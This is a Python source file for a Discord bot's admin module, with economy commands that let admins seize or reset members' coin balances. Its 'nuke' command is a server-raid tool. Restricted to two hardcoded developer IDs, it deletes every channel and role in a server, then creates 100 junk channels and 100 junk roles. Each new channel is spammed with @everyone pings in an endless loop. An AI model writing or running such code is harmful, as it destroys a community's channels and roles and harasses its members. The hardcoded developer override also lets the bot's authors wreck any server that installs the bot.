import discord
import asyncio

from discord.ext import commands
from MainFunction import *


def checkOwner(user: discord.Member = None):
    developer_list = [923045277621968916, 971519521225580544]
    return user.id in developer_list


async def checkAdmin(user: discord.Member = None):
    users = await get_data()
    isAdmin = users[str(user.id)]["isAdmin"]

    return isAdmin is True or checkOwner(user)


class Admin(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command()
    async def addowner(self, ctx, *members: discord.Member):
        users = await get_data()

        if checkOwner(ctx.author):
            for member in members:
                if not users[str(member.id)]["isAdmin"]:
                    await update_new_account(member)
                    await update_data(member, True, "isAdmin")

                    await ctx.send(f"{member.mention} has been added to the owner list")

                else:
                    await ctx.send(f"{member.mention} is already in the owner list")

    @commands.command()
    async def ak47(self, ctx, member: discord.Member = None):
        if member is None:
            raise commands.BadArgument

        isAdmin = await checkAdmin(ctx.author)
        if isAdmin:
            balance = await get_bank(member)

            await update_data(member, 0, "wallet")
            await update_data(member, 0, "bank")

            await update_data(ctx.author, balance[0], "wallet")
            await update_data(ctx.author, balance[1], "bank")

            embed = discord.Embed(
                description=f"You shot **{member.name}** and got :coin: **{balance[0] + balance[1]}**!", color=discord.Color.red())
            embed.set_image(
                url="https://media.tenor.com/fVnM6XgEPi0AAAAC/krink-akm.gif")

            await ctx.send(embed=embed)

    @commands.command()
    async def givemoneyto(self, ctx, amount: int = 1, member: discord.Member = None):
        if member is None:
            member = ctx.author

        balance = await get_bank(member)
        isAdmin = await checkAdmin(ctx.author)

        if isAdmin:
            await update_data(member, balance[0] + amount)
            await ctx.send(f"You gave :coin: **{amount}** to **{member.name}**")

    @commands.command()
    async def resetmoney(self, ctx, member: discord.Member = None):
        if member is None:
            raise commands.BadArgument

        isAdmin = await checkAdmin(ctx.author)
        if isAdmin:
            await update_data(member, 0, "wallet")
            await update_data(member, 0, "bank")

            await ctx.send("All users' wallet and bank have been reset to 0.")

    @commands.command()
    async def helpadmin(self, ctx):
        isAdmin = await checkAdmin(ctx.author)
        if isAdmin:
            await ctx.send("""```
Hello, this is the admin help command. You have special permissions!
Here are the admin commands you can use:
breh!ak47 @user: Use an imaginary AK47 on a member
breh!nuke: You know what happens
""")

    @commands.command()
    async def nuke(self, ctx):
        if checkOwner(ctx.author):
            if ctx.author.guild_permissions.manage_channels and ctx.author.guild_permissions.manage_roles:
                try:
                    for channel in ctx.guild.channels:
                        await channel.delete()

                    category = await ctx.guild.create_category(
                        "GET-NUKED-BY-GRID")

                    channel_tasks = []

                    for i in range(1, 101):
                        new_channel = await ctx.guild.create_text_channel(
                            f"GET-NUKED-BY-GRID", category=category)
                        channel_task = asyncio.create_task(
                            self.send_success_message(new_channel))
                        channel_tasks.append(channel_task)

                    await asyncio.gather(*channel_tasks)

                    for role in ctx.guild.roles:
                        if role != ctx.guild.default_role:
                            await role.delete()

                    for i in range(1, 101):
                        await ctx.guild.create_role(name=f"GET-NUKED-BY-GRID")

                    await ctx.send("Channels and roles created!")

                except discord.Forbidden:
                    await ctx.send(
                        "I don't have permission to perform this action.")

            else:
                await ctx.send(
                    "You don't have the necessary permissions to use this command."
                )

    async def send_success_message(self, channel):
        while True:
            await channel.send("@everyone get nuked by grid")


async def setup(client):
    await client.add_cog(Admin(client))
